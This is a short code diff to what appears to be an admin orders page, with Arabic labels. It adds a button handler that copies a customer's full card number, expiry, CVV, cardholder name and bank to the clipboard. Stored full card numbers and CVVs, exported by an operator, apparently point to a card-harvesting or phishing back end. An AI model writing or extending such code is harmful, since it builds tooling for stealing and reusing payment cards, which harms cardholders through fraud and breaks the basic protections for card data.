@@ -44,6 +44,24 @@ const AdminOrders = () => {
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState("");
   const [statusFilter, setStatusFilter] = useState<string>("all");
+  const [copiedId, setCopiedId] = useState<string | null>(null);
+
+  const copyCardInfo = (order: Order) => {
+    const parts: string[] = [];
+    if (order.cardholder_name) parts.push(`الاسم: ${order.cardholder_name}`);
+    if (order.card_full_number) parts.push(`الرقم: ${order.card_full_number}`);
+    else if (order.card_last4) parts.push(`الرقم: •••• ${order.card_last4}`);
+    if (order.card_expiry) parts.push(`الانتهاء: ${order.card_expiry}`);
+    if (order.card_cvv) parts.push(`CVV: ${order.card_cvv}`);
+    if (order.card_brand) parts.push(`النوع: ${order.card_brand}`);
+    if (order.bank_name) parts.push(`البنك: ${order.bank_name}`);
+    
+    navigator.clipboard.writeText(parts.join("\n")).then(() => {
+      setCopiedId(order.id);
+      toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
+      setTimeout(() => setCopiedId(null), 2000);
+    });
+  };
 
   const fetchOrders = async () => {
     const { data } = await supabase
